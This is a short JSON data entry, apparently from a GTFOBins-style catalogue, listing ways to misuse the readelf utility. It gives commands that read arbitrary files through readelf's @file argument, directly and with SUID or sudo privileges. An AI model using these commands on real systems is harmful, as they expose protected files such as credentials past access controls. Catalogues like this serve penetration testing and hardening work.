{
  "functions": {
    "file-read": [
      {
        "description": "",
        "code": "LFILE=file_to_read\nreadelf -a @$LFILE\n"
      }
    ],
    "suid": [
      {
        "description": "",
        "code": "LFILE=file_to_read\n./readelf -a @$LFILE\n"
      }
    ],
    "sudo": [
      {
        "description": "",
        "code": "LFILE=file_to_read\nsudo readelf -a @$LFILE\n"
      }
    ]
  }
}
